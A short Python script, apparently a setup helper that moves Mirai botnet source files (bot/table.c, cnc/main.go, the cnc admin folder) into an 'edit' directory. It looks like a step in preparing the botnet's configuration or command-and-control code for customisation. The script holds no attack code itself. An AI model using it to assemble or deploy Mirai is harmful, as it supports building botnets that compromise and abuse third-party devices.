import subprocess,os,sys,random,time,urllib3,subprocess,base64

def run(cmd):                                                  
     subprocess.call(cmd, shell=True)

run("mkdir edit")
run("mkdir edit/bot")
run("mkdir edit/cnc")
run("mv JG/mirai/bot/table.c edit/bot")

run("mv JG/mirai/cnc/main.go edit/cnc")
run("mv JG/mirai/cnc/admin edit/cnc")
